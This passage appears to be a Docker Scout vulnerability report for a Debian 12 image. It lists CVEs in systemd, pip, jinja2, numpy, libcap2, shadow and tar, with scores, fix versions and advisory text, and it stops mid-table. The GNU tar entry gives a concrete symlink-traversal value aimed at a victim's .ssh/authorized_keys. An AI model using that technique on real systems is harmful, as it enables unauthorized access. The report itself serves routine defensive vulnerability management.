<a href="https://scout.docker.com/v/CVE-2023-31438?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31438" src="https://img.shields.io/badge/CVE--2023--31438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.147%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31437?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31437" src="https://img.shields.io/badge/CVE--2023--31437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.187%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2013-4392?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2013--4392" src="https://img.shields.io/badge/CVE--2013--4392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.037%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.

---
- systemd <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=725357)
[wheezy] - systemd <not-affected> (/etc/tmpfiles.d not supported in Wheezy)
https://bugzilla.redhat.com/show_bug.cgi?id=859060
only relevant to systems running systemd along with selinux

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>pip</strong> <code>25.0.1</code> (pypi)</summary>

<small><code>pkg:pypi/pip@25.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-8869?s=github&n=pip&t=pypi&vr=%3C%3D25.2"><img alt="medium 5.9: CVE--2025--8869" src="https://img.shields.io/badge/CVE--2025--8869-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Link Resolution Before File Access ('Link Following')</i>

<table>
<tr><td>Affected range</td><td><code><=25.2</code></td></tr>
<tr><td>Fixed version</td><td><code>25.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a "fixed" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the "vulnerable" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-8643?s=pypa&n=pip&t=pypi&vr=%3C26.1.2"><img alt="medium 5.5: CVE--2026--8643" src="https://img.shields.io/badge/CVE--2026--8643-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><26.1.2</code></td></tr>
<tr><td>Fixed version</td><td><code>26.1.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-6357?s=github&n=pip&t=pypi&vr=%3C26.1"><img alt="medium 5.3: CVE--2026--6357" src="https://img.shields.io/badge/CVE--2026--6357-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Inclusion of Functionality from Untrusted Control Sphere</i>

<table>
<tr><td>Affected range</td><td><code><26.1</code></td></tr>
<tr><td>Fixed version</td><td><code>26.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3219?s=github&n=pip&t=pypi&vr=%3C%3D26.0.1"><img alt="medium 4.6: CVE--2026--3219" src="https://img.shields.io/badge/CVE--2026--3219-lightgrey?label=medium%204.6&labelColor=fbb552"/></a> <i>Unrestricted Upload of File with Dangerous Type</i>

<table>
<tr><td>Affected range</td><td><code><=26.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>26.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing "incorrect" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-1703?s=github&n=pip&t=pypi&vr=%3C26.0"><img alt="low 2.0: CVE--2026--1703" src="https://img.shields.io/badge/CVE--2026--1703-lightgrey?label=low%202.0&labelColor=fce1a9"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><26.0</code></td></tr>
<tr><td>Fixed version</td><td><code>26.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>jinja2</strong> <code>2.11.3</code> (pypi)</summary>

<small><code>pkg:pypi/jinja2@2.11.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-27516?s=github&n=jinja2&t=pypi&vr=%3C%3D3.1.5"><img alt="medium 5.4: CVE--2025--27516" src="https://img.shields.io/badge/CVE--2025--27516-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements Used in a Template Engine</i>

<table>
<tr><td>Affected range</td><td><code><=3.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.121%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-56326?s=github&n=jinja2&t=pypi&vr=%3C%3D3.1.4"><img alt="medium 5.4: CVE--2024--56326" src="https://img.shields.io/badge/CVE--2024--56326-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Protection Mechanism Failure</i>

<table>
<tr><td>Affected range</td><td><code><=3.1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.570%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34064?s=github&n=jinja2&t=pypi&vr=%3C3.1.4"><img alt="medium 5.4: CVE--2024--34064" src="https://img.shields.io/badge/CVE--2024--34064-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code><3.1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.230%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.

Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-22195?s=github&n=jinja2&t=pypi&vr=%3C3.1.3"><img alt="medium 5.4: CVE--2024--22195" src="https://img.shields.io/badge/CVE--2024--22195-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code><3.1.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.151%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>numpy</strong> <code>1.19.5</code> (pypi)</summary>

<small><code>pkg:pypi/numpy@1.19.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-33430?s=github&n=numpy&t=pypi&vr=%3E%3D1.9.0%2C%3C1.21"><img alt="medium 6.0: CVE--2021--33430" src="https://img.shields.io/badge/CVE--2021--33430-lightgrey?label=medium%206.0&labelColor=fbb552"/></a> <i>Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</i>

<table>
<tr><td>Affected range</td><td><code>>=1.9.0<br/><1.21</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21</code></td></tr>
<tr><td>CVSS Score</td><td><code>6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.173%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Buffer Overflow vulnerability exists in NumPy 1.9.x in the PyArray_NewFromDescr_int function of ctors.c when specifying arrays of large dimensions (over 32) from Python code, which could let a malicious user cause a Denial of Service.

NOTE: The vendor does not agree this is a vulnerability; In (very limited) circumstances a user may be able provoke the buffer overflow, the user is most likely already privileged to at least provoke denial of service by exhausting memory. Triggering this further requires the use of uncommon API (complicated structured dtypes), which is very unlikely to be available to an unprivileged user.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-34141?s=github&n=numpy&t=pypi&vr=%3C1.22"><img alt="medium 5.3: CVE--2021--34141" src="https://img.shields.io/badge/CVE--2021--34141-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Incorrect Comparison</i>

<table>
<tr><td>Affected range</td><td><code><1.22</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.064%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Incomplete string comparison in the numpy.core component in NumPy1.9.x, which allows attackers to fail the APIs via constructing specific string objects.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libcap2</strong> <code>1:2.66-4</code> (deb)</summary>

<small><code>pkg:deb/debian/libcap2@1%3A2.66-4?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-4878?s=debian&n=libcap2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.66-4%2Bdeb12u3"><img alt="medium : CVE--2026--4878" src="https://img.shields.io/badge/CVE--2026--4878-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.66-4+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.66-4+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in libcap. A local unprivileged user can exploit a Time-of-check-to-time-of-use (TOCTOU) race condition in the `cap_set_file()` function. This allows an attacker with write access to a parent directory to redirect file capability updates to an attacker-controlled file. By doing so, capabilities can be injected into or stripped from unintended executables, leading to privilege escalation.

---
- libcap2 1:2.78-1
[trixie] - libcap2 1:2.75-10+deb13u1
[bookworm] - libcap2 1:2.66-4+deb12u3
[bullseye] - libcap2 <postponed> (Minor issue)
https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f78v-p5hx-m7hh
https://sites.google.com/site/fullycapable/release-notes-for-libcap#h.x4zn8j3lss6r
Fixed by: https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=286ace1259992bd0c5d9016715833f2e148ac596 (libcap-2.78)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1390?s=debian&n=libcap2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.66-4%2Bdeb12u1"><img alt="medium : CVE--2025--1390" src="https://img.shields.io/badge/CVE--2025--1390-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.66-4+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.66-4+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.059%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The PAM module pam_cap.so of libcap configuration supports group names starting with “@”, during actual parsing, configurations not starting with “@” are incorrectly recognized as group names. This may result in nonintended users being granted an inherited capability set, potentially leading to security risks. Attackers can exploit this vulnerability to achieve local privilege escalation on systems where /etc/security/capability.conf is used to configure user inherited privileges by constructing specific usernames.

---
- libcap2 1:2.73-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098318)
[bookworm] - libcap2 1:2.66-4+deb12u1
https://bugzilla.openanolis.cn/show_bug.cgi?id=18804
Fixed by: https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=1ad42b66c3567481cc5fa22fc1ba1556a316d878 (cap/v1.2.74-rc4)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>shadow</strong> <code>1:4.13+dfsg1-1</code> (deb)</summary>

<small><code>pkg:deb/debian/shadow@1%3A4.13%2Bdfsg1-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-4641?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A4.13%2Bdfsg1-1%2Bdeb12u1"><img alt="medium : CVE--2023--4641" src="https://img.shields.io/badge/CVE--2023--4641-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in shadow-utils. When asking for a new password, shadow-utils asks the password twice. If the password fails on the second attempt, shadow-utils fails in cleaning the buffer used to store the first entry. This may allow an attacker with enough access to retrieve the password from the memory.

---
- shadow 1:4.13+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1051062)
[bookworm] - shadow 1:4.13+dfsg1-1+deb12u1
[buster] - shadow <no-dsa> (Minor issue)
https://bugzilla.redhat.com/show_bug.cgi?id=2215945
https://github.com/shadow-maint/shadow/commit/65c88a43a23c2391dcc90c0abda3e839e9c57904 (4.14.0-rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-29383?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A4.13%2Bdfsg1-1%2Bdeb12u1"><img alt="low : CVE--2023--29383" src="https://img.shields.io/badge/CVE--2023--29383-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:4.13+dfsg1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.041%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that "cat /etc/passwd" shows a rogue user account.

---
- shadow 1:4.13+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1034482)
[bookworm] - shadow 1:4.13+dfsg1-1+deb12u1
[buster] - shadow <no-dsa> (Minor issue)
https://github.com/shadow-maint/shadow/pull/687
Fixed by: https://github.com/shadow-maint/shadow/commit/e5905c4b84d4fb90aefcd96ee618411ebfac663d (4.14.0-rc1)
Regression fix: https://github.com/shadow-maint/shadow/commit/2eaea70111f65b16d55998386e4ceb4273c19eb4 (4.14.0-rc1)
https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=31797
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2023-29383-abusing-linux-chfn-to-misrepresent-etc-passwd/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2007-5686?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2007--5686" src="https://img.shields.io/badge/CVE--2007--5686-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.155%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.

---
- shadow <unfixed> (unimportant)
See #290803, on Debian LOG_UNKFAIL_ENAB in login.defs is set to no so
unknown usernames are not recorded on login failures

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>tar</strong> <code>1.34+dfsg-1.2+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/tar@1.34%2Bdfsg-1.2%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-45582?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D1.34%2Bdfsg-1.2%2Bdeb12u1"><img alt="medium : CVE--2025--45582" src="https://img.shields.io/badge/CVE--2025--45582-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.130%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Tar through 1.35 allows file overwrite via directory traversal in crafted TAR archives, with a certain two-step process. First, the victim must extract an archive that contains a ../ symlink to a critical directory. Second, the victim must extract an archive that contains a critical file, specified via a relative pathname that begins with the symlink name and ends with that critical file's name. Here, the extraction follows the symlink and overwrites the critical file. This bypasses the protection mechanism of "Member name contains '..'" that would occur for a single TAR archive that attempted to specify the critical file via a ../ approach. For example, the first archive can contain "x -> ../../../../../home/victim/.ssh" and the second archive can contain x/authorized_keys. This can affect server applications that automatically extract any number of user-supplied TAR archives, and were relying on the blocking of traversal. This can also affect software installation processes in which "tar xf" is run more than once (e.g., when installing a package can automatically install two dependencies that are set up as untrusted tarballs instead of official packages).

---
Disputed tar issue, works as documented per upstream:
https://lists.gnu.org/archive/html/bug-tar/2025-08/msg00012.html
https://github.com/i900008/vulndb/blob/main/Gnu_tar_vuln.md

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2005-2541?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2005--2541" src="https://img.shields.io/badge/CVE--2005--2541-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.763%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.

---
This is intended behaviour, after all tar is an archiving tool and you
need to give -p as a command line flag
- tar <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=328228; unimportant)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libtasn1-6</strong> <code>4.19.0-2</code> (deb)</summary>

<small><code>pkg:deb/debian/libtasn1-6@4.19.0-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-12133?s=debian&n=libtasn1-6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.19.0-2%2Bdeb12u1"><img alt="medium : CVE--2024--12133" src="https://img.shields.io/badge/CVE--2024--12133-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
